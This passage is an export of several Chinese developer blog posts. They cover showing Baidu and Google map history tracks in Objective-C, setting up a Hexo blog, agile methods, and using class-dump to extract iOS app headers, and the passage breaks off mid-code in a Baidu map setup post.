    <content type="text"><![CDATA[月落乌啼霜满天，江枫渔火对愁眠。姑苏城外寒山寺，夜半钟声到客船。 前言 思 考 要 怎 么 开 始 。。。 嗯 (过了一万年。。。) 最近一直在做一个宠物定位的项目，本来以为只需要参考官方文档接入地图实现功能就可以winner winner chicken dinner了，但是等到我掉以轻心的做到后面再加上历史轨迹疯狂改需求的时候，又双叒叕加上还要百度和谷歌同步实现功能，心中开始有一万只神兽在奔腾，于是、、就有了这篇文章的由来了。 关于历史轨迹 补一张效果图 历史轨迹历经了好几个版本的在几个方案之间来回拉锯，现在终于是。。。还没有定下来具体的方案了🤣 方案一：选时间段查询历史轨迹数据后全部显示在地图上面，然后可以点击播放按钮回放历史轨迹并画线；或者拖动一个UISlideBar滑动条可以切换每一轨迹点并显示轨迹详细信息弹框。 方案二：选时间段查询历史轨迹数据后显示第一个点在地图上面，然后可以通过四个操作按钮（起点，上一个，下一个，终点）切换轨迹点画线并显示轨迹详细信息弹框；或者手动点击切换每一轨迹点并显示轨迹详细信息弹框。 方案三：选时间段查询历史轨迹数据后全部显示在地图上面，然后可以通过四个操作按钮（起点，上一个，下一个，终点）切换轨迹点并显示轨迹详细信息弹框；或者手动点击切换每一轨迹点并显示轨迹详细信息弹框。 方案四五六七八九…待客户和老板定。 问题 方案一：查询轨迹过多导致获取数据比较耗时，显示点比较多画线乱。 方案二：筛选所选时间段的估计点（抽取平均10个点出来，后来又改为5个，在在后来改为服务器配置），画线功能由服务器配置，选择时间段间隔服务器配置。 方案三：在方案二的基础上，分页获取所有数据并全部显示 方案四五六七八九…未知 百度地图历史轨迹开始挖坑 历史古迹无非就是多个位置点构成，所以和上一篇的添加坐标点大头针一样，只是添加多个而已，考虑到控件的重用机制，所以有了下面的代码 1234567891011121314151617181920212223242526// ... 遍历历史古迹数据 创建地图大头针// ... 对每一个坐标反地理编码// ... 在反地理编码里面刷新对应的模型信息地址 并刷新自定义弹框paopaoView- (BMKAnnotationView *)mapView:(BMKMapView *)mapView viewForAnnotation:(id &lt;BMKAnnotation&gt;)annotation&#123; if (![annotation isKindOfClass:[XSPointAnnotation class]]) &#123; // 不是自定义大头针模型 return nil; &#125; BMKAnnotationView *annotationView = nil; XSPointAnnotation *customAnnotation = (XSPointAnnotation *)annotation; if (customAnnotation.annotationType == XSAnnotationTypeLocationPoint) &#123; // 当前位置点类型 annotationView = [mapView dequeueReusableAnnotationViewWithIdentifier:@"LocationAnnotation"]; if (annotationView == nil) &#123; annotationView = [[BMKPinAnnotationView alloc] initWithAnnotation:customAnnotation reuseIdentifier:@"LocationAnnotation"]; &#125; annotationView.image = [UIImage imageNamed:[customAnnotation.locationDetailsModel.deviceBindingTypeImageName stringByAppendingString:@"_small"]]; annotationView.draggable = NO; annotationView.canShowCallout = YES; self.petAnnotationView.locationDetails = customAnnotation.locationDetailsModel; self.petAnnotationView.isHiddenNoNeeds = YES; self.petAnnotationView.width = 270; annotationView.paopaoView = [[BMKActionPaopaoView alloc] initWithCustomView:self.petAnnotationView]; [annotationView setSelected:YES animated:NO]; // 选中当前的 &#125; return annotationView;&#125; 掉坑里了 如果所有的大头针都共用一个自定义的paopaoView（petAnnotationView）的话，就会导致selectAnnotation:animated:方法没有效果 并且只有最后添加的那一个轨迹带你点击才会调用selectAnnotation:animated: 其他大头针点击都会失效 如果要控制切换轨迹点刷新显示弹框信息，那就需要根据索引先移除当前点，再重新添加重新渲染，而且切换不流畅，会出现莫名的问题 怎么从坑里跳出来？ 1、找大牛 2、查资料 3、习惯有坑，顺其自然 但是 作为一个视这世界上只有两件事是真理：人都会死；程序永远有bug为座右铭的程序猿，当然是选择3啊，但是考虑到这样有可能会被打死，而求人又不如求己的理念，我就开始苦逼的查资料，看官方demo和官方论坛（屎一样的论坛，永远回复：在处理中、感谢你的反馈） 经过我的反复查询资料，不断尝试，最后终于在我的灵机一动下解决了，再次印证了爱迪生的话但那1％的灵感是最重要的，甚至比那99％的汗水都要重要。😂 既然一个轨迹点可以正常的点击显示和隐藏，是不是需要每一个轨迹点大头针都需要绑定一个paopaoView呢 本着实践是检验真理的唯一标准，于是有了以下代码 12345678910111213141516171819202122232425- (BMKAnnotationView *)mapView:(BMKMapView *)mapView viewForAnnotation:(id &lt;BMKAnnotation&gt;)annotation&#123; if (![annotation isKindOfClass:[XSPointAnnotation class]]) &#123; // 不是自定义大头针模型 return nil; &#125; BMKAnnotationView *annotationView = nil; XSPointAnnotation *customAnnotation = (XSPointAnnotation *)annotation; if (customAnnotation.annotationType == XSAnnotationTypeLocationPoint) &#123; // 当前位置点类型 annotationView = [mapView dequeueReusableAnnotationViewWithIdentifier:@&quot;XSTracksLocationAnnotation&quot;]; if (annotationView == nil) &#123; annotationView = [[BMKPinAnnotationView alloc] initWithAnnotation:customAnnotation reuseIdentifier:@&quot;XSTracksLocationAnnotation&quot;]; &#125; XSLocationDetails *locationDetails = customAnnotation.locationDetailsModel; XSPetAnnotationView *petAnnotationView = [XSPetAnnotationView petAnnotationView]; annotationView.image = [UIImage imageNamed:[customAnnotation.locationDetailsModel.deviceBindingTypeImageName stringByAppendingString:@&quot;_small&quot;]]; annotationView.draggable = NO; annotationView.canShowCallout = YES; petAnnotationView.isHiddenNoNeeds = YES; petAnnotationView.width = 270; petAnnotationView.locationDetails = locationDetails; annotationView.paopaoView = [[BMKActionPaopaoView alloc] initWithCustomView:petAnnotationView]; self.petAnnotationView = petAnnotationView; &#125; return annotationView;&#125; 是骡子是马拉出来溜溜，编译运行，轨迹点都可以点击了，哇，开心的就像一个几十岁的孩子拍了拍肚皮，正准备去喝杯Coffee舒爽一下呢，发现地址信息没有 于是开始考虑现在是一个轨迹点对应一个自定义的paopaoView，那么在反地理编码的代理回调里面怎么把地址信息对应的轨迹点模型更新呢 根据代理回调里面location坐标和当前的所有历史轨迹数据坐标对比, 开心的打印一下，竟然和传递的转换前的坐标有误差； 仿谷歌地图反地理编码，改代理回调为block回调？直接动手 123456789// XSBaiduGeocoder.htypedef void (^XSReverseGeocodeHandler)(BMKReverseGeoCodeResult *result);@interface XSBaiduGeocoder : NSObject+ (instancetype)geocoder;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler;@end 12345678910111213141516171819202122232425262728293031323334353637383940414243// XSBaiduGeocoder.m@interface XSBaiduGeocoder () &lt;BMKGeoCodeSearchDelegate&gt;@property (nonatomic, copy) XSReverseGeocodeHandler reverseGeocodeHandler;@end@implementation XSBaiduGeocoder+ (instancetype)geocoder&#123; static XSBaiduGeocoder *helper; static dispatch_once_t onceToken; dispatch_once(&amp;onceToken, ^&#123; helper = [[XSBaiduGeocoder alloc] init]; &#125;); return helper;&#125;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler&#123; XSLogFunc self.reverseGeocodeHandler = handler; // 解析地址 BMKReverseGeoCodeOption *reverseGeocodeSearchOption = [[BMKReverseGeoCodeOption alloc] init]; reverseGeocodeSearchOption.reverseGeoPoint = coordinate; BMKGeoCodeSearch *geoCodeSearch = [[XSGeoCodeSearch alloc] init]; geoCodeSearch.delegate = self; if (![geoCodeSearch reverseGeoCode:reverseGeocodeSearchOption]) &#123; XSLog(@"百度反地理编码获取地址失败"); &#125; else &#123; XSLog(@"百度反地理编码获取地址成功"); &#125;&#125;- (void)onGetReverseGeoCodeResult:(BMKGeoCodeSearch *)searcher result:(BMKReverseGeoCodeResult *)result errorCode:(BMKSearchErrorCode)error&#123; XSLogFunc if (self.reverseGeocodeHandler) &#123; self.reverseGeocodeHandler(result); &#125;&#125;@end BMKGeoCodeSearch这个一定要调用一次创建一次，否则只会转换一次地址信息 但是此时虽然轨迹点地址信息都转换了，但是只有点击最后一个轨迹点有地址信息，其他都是空的，这个问题卡了好久脑子没转过来，一直在block捕获方向考虑，后来突然醒悟 self.reverseGeocodeHandler = handlerblock是每次都进来赋值，而地址转换完成的代理回调方法又调用延迟，那在代理回调方法里面回调临时保存的self.reverseGeocodeHandler肯定是最后一个，所以就只会更新最后一个轨迹坐标的模型地址数据 既然BMKGeoCodeSearch是每一个坐标对应一个，那个完全可以自定义XSGeoCodeSearch继承BMKGeoCodeSearch添加对应的回调handler，等地址转换完成的代理回调时候，根据XSGeoCodeSearch保存的handler回调回去，于是代码修改如下 12345678910// XSGeoCodeSearch.h@class BMKReverseGeoCodeResult;typedef void (^XSReverseGeocodeHandler)(BMKReverseGeoCodeResult *result);@interface XSGeoCodeSearch : BMKGeoCodeSearch@property (nonatomic, copy) XSReverseGeocodeHandler reverseGeocodeHandler;@end 1234567// XSBaiduGeocoder.h@interface XSBaiduGeocoder : NSObject+ (instancetype)geocoder;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler;@end 12345678910111213141516171819202122232425262728293031323334353637383940414243// XSBaiduGeocoder.m@interface XSBaiduGeocoder () &lt;BMKGeoCodeSearchDelegate&gt;@end@implementation XSBaiduGeocoder+ (instancetype)geocoder&#123; static XSBaiduGeocoder *helper; static dispatch_once_t onceToken; dispatch_once(&amp;onceToken, ^&#123; helper = [[XSBaiduGeocoder alloc] init]; &#125;); return helper;&#125;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler&#123; XSLogFunc // 解析地址 BMKReverseGeoCodeOption *reverseGeocodeSearchOption = [[BMKReverseGeoCodeOption alloc] init]; reverseGeocodeSearchOption.reverseGeoPoint = coordinate; XSGeoCodeSearch *geoCodeSearch = [[XSGeoCodeSearch alloc] init]; geoCodeSearch.reverseGeocodeHandler = handler; geoCodeSearch.delegate = self; if (![geoCodeSearch reverseGeoCode:reverseGeocodeSearchOption]) &#123; XSLog(@"百度反地理编码获取地址失败"); &#125; else &#123; XSLog(@"百度反地理编码获取地址成功"); &#125;&#125;- (void)onGetReverseGeoCodeResult:(BMKGeoCodeSearch *)searcher result:(BMKReverseGeoCodeResult *)result errorCode:(BMKSearchErrorCode)error&#123; XSLogFunc // 查询searcher 对应的block 然后回调 XSGeoCodeSearch *codeSearcher = (XSGeoCodeSearch *)searcher; if (codeSearcher.reverseGeocodeHandler) &#123; codeSearcher.reverseGeocodeHandler(result); &#125;&#125;@end 再运行，点击切换轨迹点，世界都美好了，操作轨迹点的切换也可以直接使用selectAnnotation:animated:弹出详情自定义弹框了 轨迹点区域控制 如果想控制所有的估计点都在屏幕范围内显示，最早使用的上一篇里面的方法，后来查资料看这一种也可以 1234567891011121314151617181920212223- (void)baiduMapViewFitAnnotationsWithCoordinates:(NSArray *)coordsModels count:(NSUInteger)count&#123; //创建两个数组，用来存所有的经度和纬度 if (count &lt; 2) return; NSMutableArray *latArr = [[NSMutableArray alloc] init]; NSMutableArray *lonArr = [[NSMutableArray alloc] init]; for (XSLocationDetails *locationDetails in coordsModels) &#123; [latArr addObject:@(locationDetails.coordinateBD09ll.latitude)]; [lonArr addObject:@(locationDetails.coordinateBD09ll.longitude)]; &#125; NSNumber *latMax = [latArr valueForKeyPath:@"@max.floatValue"];//最大纬度 NSNumber *latMin = [latArr valueForKeyPath:@"@min.floatValue"];//最小纬度 NSNumber *lonMax = [lonArr valueForKeyPath:@"@max.floatValue"];//最大经度 NSNumber *lonMin = [lonArr valueForKeyPath:@"@min.floatValue"];//最小经度 BMKCoordinateRegion region; region.center.latitude = ([latMax doubleValue] + [latMin doubleValue]) / 2; region.center.longitude = ([lonMax doubleValue] + [lonMin doubleValue]) / 2; region.span.latitudeDelta = 0.0055; // 数字越小 缩放等级越大 region.span.longitudeDelta = 0.0055; region = [self.baiduMapView regionThatFits:region]; [self.baiduMapView setRegion:region animated:YES];&#125; 当然还有更简单的方法,所以一定要多看各种SDK的头文件，看都有哪些功能 12345/** *设置地图使显示区域显示所有annotations,如果数组中只有一个则直接设置地图中心为annotation的位置 *@param annotations 指定的标注 *@param animated 是否启动动画 */- (void)showAnnotations:(NSArray *)annotations animated:(BOOL)animated; 谷歌地图历史轨迹 关于谷歌地图历史轨迹，基本上就没什么说的了，接口相比百度更规范和清晰 谷歌地图添加Marker(相当于百度地图Annotation)直接配置大头针各种属性然后marker.map = self.googleMapView就等于添加了一个大头针，没有回调 谷歌地图触发paopaoView的时候，调用 12345678910111213141516171819- (UIView *)mapView:(GMSMapView *)mapView markerInfoWindow:(GMSMarker *)marker&#123; XSMarker *myMarker = (XSMarker *)marker; XSLocationDetails *locationModel = myMarker.locationDetailsModel; XSPetAnnotationView *petAnnotationView = [XSPetAnnotationView petAnnotationView]; petAnnotationView.isHiddenNoNeeds = YES; [[GMSGeocoder geocoder] reverseGeocodeCoordinate:locationModel.locationCoordinate2D completionHandler:^(GMSReverseGeocodeResponse * _Nullable response, NSError * _Nullable error) &#123; // 获取第一个位置信息 GMSAddress *addressModel = response.firstResult; NSString *firstString = addressModel.lines.firstObject; NSString *lastString = addressModel.lines.lastObject; NSString *address = [NSString stringWithFormat:@"%@, %@", firstString, lastString]; locationModel.deviceAddress = address; petAnnotationView.locationDetails = locationModel; // 地址转换处理重新刷新界面 &#125;]; petAnnotationView.width = 270; petAnnotationView.locationDetails = locationModel; return petAnnotationView;&#125; 谷歌地图貌似没有可以获取地图上所有Marker的方法（可能我没找到），需要添加的时候自己维护一个数组 谷歌地图的反地理编码本来就是block回调 谷歌地图控制所有轨迹点范围的实现 12345678- (void)googleMapViewFitAnnotationsWithCoordinates:(NSArray *)coordsModels count:(NSUInteger)count&#123; GMSCoordinateBounds *bounds = [[GMSCoordinateBounds alloc] init]; for (XSLocationDetails *locationDetails in coordsModels) &#123; bounds = [bounds includingCoordinate:locationDetails.locationCoordinate2D]; &#125; [self.googleMapView animateWithCameraUpdate:[GMSCameraUpdate fitBounds:bounds withPadding:30.0f]];&#125;]]></content>
      <categories>
        <category>iOS</category>
        <category>地图</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>地图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客搭建]]></title>
    <url>%2Farchives%2Fb8f4bd70.html</url>
    <content type="text"><![CDATA[之前在学习编程和开始工作的时候，也都有整理和写笔记的习惯，笔记一直是使用Gitbook编辑整理和同步的，也有想搭建一个自己的博客但是又因为自己太懒散，而且感觉搭建博客比较复杂，所以就一直没有付诸行动；直到最近偶然看到介绍使用Hexo + GitHubPages搭建博客的文章，就查了下相关的资料和介绍，搭建了一个简单的博客（GitHubPages + Hexo + Next主题）。 关于博客 常见的博客搭建方法（查到资料的） WordPress：一般需要独立域名（收费），传统的博客搭建方法，但是对MarkDown支持不是很好 GitHubPages + Jekell：免费，稍微比较麻烦 GitHubPages + Hexo：免费，使用简单，适合新手入门 关于Hexo Hexo 是一个基于 Nodejs 的静态博客网站生成器，作者是来自中国台湾的Tommy Chen。 作者网站 特点 部署方便且速度快 支持Markdown语法 已移植 Octopress 插件 高扩展性、自订性 兼容Windows, Mac &amp; Linux Hexo实现原理 1、Hexo是一个静态博客生成器，根据给定的主题，负责把写好的 Markdown 文章转换成一堆 HTML + CSS + Javascript 页面。 2、Hexo还有把生成好的站点上传到 Github Pages 的功能。 GitHubPages + Hexo搭建方法 关于使用可参考下面这两篇文章，写的非常详细，而且是针对Windows/Mac两个平台方法，就不在浪费时间码字了。 Mac搭建Hexo博客及NexT主题配置优化 博客搭建包含windows 常用的指令 12345hexo clean // 清空本地缓存，解决由于本地缓存导致部署无效hexo g // == hexo generate #生成静态网页gulp // 压缩生成的静态资料（如果安装gulp插件，具体安装方法见下面）hexo d // == hexo deploy #开始部署hexo s // == hexo server #启动服务器 本地调试使用 插件安装RSS订阅插件 执行如下指令 1npm install hexo-generator-feed --save 打开 Hexo 站点下的 _config.yml ,添加如下配置： 12345678# feed# Dependencies: https://github.com/hexojs/hexo-generator-feedfeed:type: atompath: atom.xmllimit: 20hub:content: 本地搜索插件 执行如下指令 1npm install hexo-generator-searchdb --save 打开 Hexo 站点的 _config.yml,添加配置 12345search:path: search.xmlfield: postformat: htmllimit: 10000 静态资源压缩插件 安装gulp 1npm install gulp -g // 如果报npm WARN deprecated警告 可使用npm install -g npm 安装gulp插件： 12345npm install gulp-minify-css --save // 如果报npm WARN deprecated警告则使用sudo npm install gulp-clean-css执行npm install gulp-uglify --savenpm install gulp-htmlmin --savenpm install gulp-htmlclean --savenpm install gulp-imagemin --save 主题配置设置网站标签页favicon图标 图标格式：32 * 32 的ico格式图标，重命名为favicon.ico 把设计好的图标放在/themes/next/source/images里 修改主题配置文件medium 1234567favicon: small: /images/favicon-16x16-next.png medium: /images/favicon.ico apple_touch_icon: /images/apple-touch-icon-next.png safari_pinned_tab: /images/logo.svg #android_manifest: /images/manifest.json #ms_browserconfig: /images/browserconfig.xml 更多配置可参考Hexo+Next个人博客主题优化 关于多电脑同步 使用电脑搭建好博客后可能面临如下问题 1、是在家里私人电脑上搭建的，想在公司也可以愉快的写文章 2、换了一台新的电脑（挣钱了要换装备😂） 3、电脑系统崩了😭 关于多电脑同步解决方案1 gitHub分支管理，master分支存博客静态网页资源，Hexo分支存所有源文件（设置为默认分支） 每个电脑每次更新文章前需要正常的git同步操作 每个电脑每次更新文章后需要正常的git同步操作 但是个人感觉不安全，别人可能直接把你的Hexo分支拉取下来就等于获取了你的全部博客资源（虽然我的博客没什么有用的价值😂） 具体分支实现可参考利用分支同步 关于多电脑同步解决方案2 每次手动拷贝最新的文件夹替换另一台电脑旧文件夹（想想就麻烦） 通过云盘如Dropbox自动同步整个文件夹，使所有的电脑都可以同步到最新的 目标电脑获取到最新的博客文件后 如果是情形3可以考虑先把整个博客目录拷贝出来到新的系统博客目录下 GitHub添加配置新电脑的SSH key 和搭建时一样参考Mac搭建Hexo博客及NexT主题配置优化 配置运行环境，执行如下指令 12brew install node // 安装Node.jsnpm install -g hexo // 安装hexo 切换到博客目录下安装博客模块和插件 (具体参考之前安装过的插件) 12345678910111213npm install npm install hexo-deployer-git --save npm install hexo-generator-feed --save npm install hexo-generator-sitemap --save npm install hexo-generator-feed --save npm install hexo-generator-searchdb --save npm install -g gulp npm install gulp-minify-css --save npm install gulp-uglify --save npm install gulp-htmlmin --save npm install gulp-htmlclean --save npm install gulp-imagemin --save 又可以愉快的随时随地写文章了😂 参考 Mac搭建Hexo博客及NexT主题配置优化 免费个人博客搭建详解 Hexo+Next个人博客主题优化 利用Hexo在多台电脑上提交和更新github pages博客]]></content>
      <categories>
        <category>整理</category>
        <category>Hexo博客搭建</category>
      </categories>
      <tags>
        <tag>整理</tag>
        <tag>Hexo博客搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[敏捷开发]]></title>
    <url>%2Farchives%2Fed2e9abb.html</url>
    <content type="text"><![CDATA[春日游，杏花吹满头。陌上谁家年少足风流？ 传统的软件开发模式需要经历问题评估、计划解决方案、设计系统架构、开发代码、测试、部署和使用系统、维护解决方案等过程。 如瀑布流模式: 它是以文档为驱动，在整个开发过程中，开发人员根据需求文档进行开发，一切以文档为依据。 缺点 由于开发模型是线性的，用户只有等到整个过程的末期才能见到开发成果，从而增加了开发的风险； 早期的错误可能要等到开发后期的测试阶段才能发现，进而带来严重的后果。 各个软件生命周期衔接花费时间较长，团队人员交流成本大。 在需求不明并且在项目进行过程中可能变化的情况下基本是不可行的。 软件开发的11种模式 敏捷开发(Agile Development) 什么是敏捷开发 1、敏捷开发(Agile Development)是一种以人为核心、迭代、循序渐进的开发方式。2、在敏捷开发中，软件项目的构建被切分成多个子项目，各个子项目的成果都经过测试，具备集成和可运行的特征。3、它并不是一门技术，而是一种开发方式，是一种软件开发的流程。4、作用指导我们用规定的环节去一步一步完成项目的开发。因为它采用的是迭代式开发，所以这种开发方式的主要驱动核心是人。 敏捷开发适用于 客户不知道自己要啥的情况，这样的客户占绝大多数。因为客户不知道要啥，所以你需要不断帮客户弄明白他到底想要啥。换句话说，你需要和客户沟通，合作，倾听反馈，持续改进； 竞争激烈的市场，这样的情况下，赶在竞争对手前交付一个不完美但至少能用的产品非常重要； 快速变化的市场，你在埋头造一辆汽车的时候，客户已经想开飞机满天飞了，这就需要你能一步步的把汽车改成飞机，还能按时交付； 适用于在一个地方办公的小团队，一般 10 个人以内。这样能使敏捷中主要的沟通方式「Face to Face」是可行的。 敏捷开发流程 敏捷开发实现方式 Scrum XP Scrum 项目角色 产品负责人（Product Owner）：主要负责确定产品的功能和达到要求的标准，指定软件的发布日期和交付的内容，同时有权力接受或拒绝开发团队的工作成果。 流程管理员（Scrum Master）：主要负责整个Scrum流程在项目中的顺利实施和进行，以及清除挡在客户和开发工作之间的沟通障碍，使得客户可以直接驱动开发。 开发团队（Scrum Team）：主要负责软件产品在Scrum规定流程下进行开发工作，人数控制在5~10人左右，每个成员可能负责不同的技术方面，但要求每成员必须要有很强的自我管理能力，同时具有一定的表达能力；成员可以采用任何工作方式，只要能达到Sprint的目标。 XP（Extreme Programming）什么是XP 极限编程（eXtreme Programming），是一种全新的、轻量级的、灵巧的软件开发方法，是一种软件工程方法学。它强调程序设计团队与业务专家之间的紧密协作、面对面的沟通（比书面的文档更有效）、频繁交付新的软件版本、紧凑而自我组织型的团队、能够很好的适应需求变化的代码编写和团队组织方法，更注重软件开发中人的作用。 XP的核心是沟通（Communication）、简单（Simplicity）、反馈（Feedback）、勇气（Courage）四大价值观，它们是XP的基础，也是XP的灵魂。敏捷开发之XP 敏捷开发中XP与SCRUM的区别 1、迭代长度的不同 XP的一个Sprint的迭代长度大致为1~2周, 而Scrum的迭代长度一般为 2~ 4周. 2、在迭代中, 是否允许修改需求 XP在一个迭代中，如果一个User Story(一个用户需求)还没有实现， 则可以考虑用另外的需求将其替换，替换的原则是需求实现的时间量是相等的。 而Scrum是不允许这样做的，一旦迭代开工会完毕, 任何需求都不允许添加进来，并有Scrum Master严格把关，不允许开发团队受到干扰 在迭代中，User Story是否严格按照优先级别来实现 XP是务必要遵守优先级别的。 但Scrum在这点做得很灵活， 可以不按照优先级别来做 Scrum这样处理的理由是：如果优先问题的解决者，由于其它事情耽搁，不能认领任务，那么整个进度就耽误了。 另外一个原因是，如果按优先级排序的User Story #6和#10，虽然#6优先级高，但是如果#6的实现要依赖于#10，则不得不优先做#10. 3、软件的实施过程中，是否采用严格的工程方法，保证进度或者质量 Scrum没有对软件的整个实施过程开出个工程实践的处方，要求开发者自觉保证。 但XP对整个流程方法定义非常严格，规定需要采用TDD, 自动测试， 结对编程，简单设计，重构等约束团队的行为。]]></content>
      <categories>
        <category>整理</category>
        <category>敏捷开发</category>
      </categories>
      <tags>
        <tag>敏捷开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编初识（Mac)]]></title>
    <url>%2Farchives%2F24e561e5.html</url>
    <content type="text"><![CDATA[Decompile class-dump安装方法当Mac升级了OSX 10.11后，配置class-dump的时候，会发现推荐的class-dump无法放入目录/usr/bin 原因是 OSX10.11的一个新特性 Rootless,也叫System Integrity Protection（SIP）和SELinux差不多，都是限制root用户的权限 其实可以在RecoveryMode关闭这个特性，这样就直接可以读写/usr/bin了，不过不建议。 关闭方法：开机的时候按住option出现选择磁盘的界面按command + R进入RecoveryMode，选择实用工具终端，输入csrutil disable回车搞定 class-dump下载地址 http://stevenygard.com/projects/class-dump/ 1、打开Terminal，输入mkdir ~/bin，在当前用户根目录下创建一个bin目录。 2、把下载下来的dmg打开，复制文件文件里面的class-dump到创建的bin目录下。赋权限:chmod +x ~/bin/class-dump 3、打开bash_profile文件配置环境变量： * vim ~/.bash\_profile * 按下 i 键进入编辑状态，在最下方加一行`export PATH=$HOME/bin/:$PATH` * 按下esc键, 再按shift+: 输入 wq! 进行保存退出编辑 4、在Terminal中执行source ~/.bash_profile 5、执行class-dump测试是否成功，成功如下： 12345678910111213141516171819202122MelodydeMBP:~ melody$ class-dumpclass-dump 3.5 (64 bit)Usage: class-dump [options] &lt;mach-o-file&gt;where options are:-a show instance variable offsets-A show implementation addresses--arch &lt;arch&gt; choose a specific architecture from a universal binary (ppc, ppc64, i386, x86_64, armv6, armv7, armv7s, arm64)-C &lt;regex&gt; only display classes matching regular expression-f &lt;str&gt; find string in method name-H generate header files in current directory, or directory specified with -o-I sort classes, categories, and protocols by inheritance (overrides -s)-o &lt;dir&gt; output directory used for -H-r recursively expand frameworks and fixed VM shared libraries-s sort classes and categories by name-S sort methods by name-t suppress header in output, for testing--list-arches list the arches in the file, then exit--sdk-ios specify iOS SDK version (will look in /Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS&lt;version&gt;.sdk--sdk-mac specify Mac OS X version (will look in /Developer/SDKs/MacOSX&lt;version&gt;.sdk--sdk-root specify the full SDK root path (or use --sdk-ios/--sdk-mac for a shortcut)MelodydeMBP:~ melody$ class-dump使用命令如下：1class-dump -H /Users/sevencho/Desktop/KYRemoteUnit.app -o /Users/sevencho/Desktop/headers -H 代表着要解析的文件 /Users/sevencho/Desktop/KYRemoteUnit.app 需要反编译的应用路径（解压.ipa包获得） -o 表示解析完成保存的目录 /Users/sevencho/Desktop/headers 反编译出的头文件存放路径 利用 class-dump 可以导出 AppKit，UIKitAppKit :1class-dump /System/Library/Frameworks/AppKit.framework UIKit :1class-dump /Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk/System/Library/Frameworks/UIKit.framework]]></content>
      <categories>
        <category>汇编</category>
        <category>汇编工具</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之地图篇(二)]]></title>
    <url>%2Farchives%2Fb3b6a999.html</url>
    <content type="text"><![CDATA[绿蚁新醅酒，红泥小火炉。晚来天欲雪，能饮一杯无？ 百度地图1、注册地图api key1234567// 在程序启动代理方法注册baidu map api key 百度开发者平台获取_mapManager = [[BMKMapManager alloc]init];// 如果要关注网络及授权验证事件，请设定 generalDelegate参数BOOL ret = [_mapManager start:XSBaiduMapApiKey generalDelegate:nil];if (!ret) &#123; XSLog(@&quot;BMKMapManager start failed!&quot;);&#125; 2、初始化地图 添加地图的初始化配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445- (void)setupBaiduMapView&#123; BMKMapView *mapView = [[BMKMapView alloc] initWithFrame:self.view.bounds]; mapView.mapType = BMKMapTypeStandard; // 设定为标准地图 mapView.showsUserLocation = YES; mapView.userTrackingMode = BMKUserTrackingModeNone; // 设置用户位置图标类型 mapView.showMapScaleBar = YES; BMKLocationViewDisplayParam *displayParam = [[BMKLocationViewDisplayParam alloc] init]; displayParam.locationViewImgName = @&quot;icon_center_point&quot;; displayParam.isAccuracyCircleShow = NO; [mapView updateLocationViewWithParam:displayParam];// 配置用户位置信息如精度圈、图标 mapView.zoomLevel = kMapsZoomLevel; mapView.minZoomLevel = kMapsMinZoomLevel; mapView.maxZoomLevel = kMapsMaxZoomLevel; [self.view insertSubview:mapView atIndex:0]; self.baiduMapView = mapView; // 定位服务 BMKLocationService *locService = [[BMKLocationService alloc] init]; locService.desiredAccuracy = kCLLocationAccuracyNearestTenMeters; [locService startUserLocationService]; self.locService = locService; // 反地理编码 BMKGeoCodeSearch *geoCodeSearch = [[BMKGeoCodeSearch alloc] init]; self.geoCodeSearch = geoCodeSearch; // 针对切换地图类型后设置代理 （如果有做地图切换功能） self.baiduMapView.delegate = self; // 此处记得不用的时候需要置nil，否则影响内存的释放 self.locService.delegate = self; self.geoCodeSearch.delegate = self;&#125;-(void)viewWillAppear:(BOOL)animated&#123; [self.baiduMapView viewWillAppear]; self.baiduMapView.delegate = self; // 此处记得不用的时候需要置nil，否则影响内存的释放 self.locService.delegate = self; self.geoCodeSearch.delegate = self;&#125;-(void)viewWillDisappear:(BOOL)animated&#123; [self.baiduMapView viewWillDisappear]; self.baiduMapView.delegate = nil; // 不用时，置nil self.locService.delegate = nil; self.geoCodeSearch.delegate = nil;&#125; 开启定位服务回调，更新用户位置信息 1234567891011-(void)didUpdateBMKUserLocation:(BMKUserLocation *)userLocation&#123; XSLog(@&quot;didUpdateBMKUserLocation位置 : %f,%f&quot;, userLocation.location.coordinate.latitude, userLocation.location.coordinate.longitude); [self.baiduMapView updateLocationData:userLocation]; self.userBaiduLocation = userLocation;&#125;- (void)didFailToLocateUserWithError:(NSError *)error&#123; XSLog(@&quot;error:%@&quot;, error);&#125; 3、显示自定义大头针 3.1、从服务器获取当前设备的相关信息转为模型数据(XSDeviceLocation *locationDetails) 3.2、根据当前显示的地图类型设置对应的坐标信息大头针 我的做法在XSDeviceLocation模型里面提供了对应地图的获取属性，在属性getter方法中进行服务器的坐标转换(处理国内返回火星坐标、国外返回标准坐标) 如获取百度坐标locationCoordinateBaidu、获取谷歌坐标locationCoordinateGoogle 根据类型设置坐标数据 123456- (void)setupPetLocationCoordinate:(CLLocationCoordinate2D)coordinate mapType:(XSDisplayMapType)mapType&#123; // 坐标过滤等其他操作 // ... [self setupBaiduMapCoordinate:coordinate];&#125; 3.3、根据设备坐标的相关配置 12345678910111213141516171819202122232425262728- (void)setupBaiduMapCoordinate:(CLLocationCoordinate2D)coordinate&#123; [self.baiduMapView setCenterCoordinate:coordinate animated:YES]; // 添加大头针模型数据 self.pointAnnotation.annotationType = XSAnnotationTypeLocationPoint; self.pointAnnotation.locationDetailsModel = self.locationDetails; self.pointAnnotation.coordinate = coordinate; [self.baiduMapView addAnnotation:self.pointAnnotation]; // 添加精度圈 !self.baiduAccuracyCircle ? : [self.baiduMapView removeOverlay:self.baiduAccuracyCircle]; // 移除添加的精度圈 if (self.locationDetails.GpsType == XSLocationModeWifiAndLbs || self.locationDetails.GpsType == XSLocationModeLbs) &#123; // wifi 显示精度圈 self.baiduAccuracyCircle = [BMKCircle circleWithCenterCoordinate:coordinate 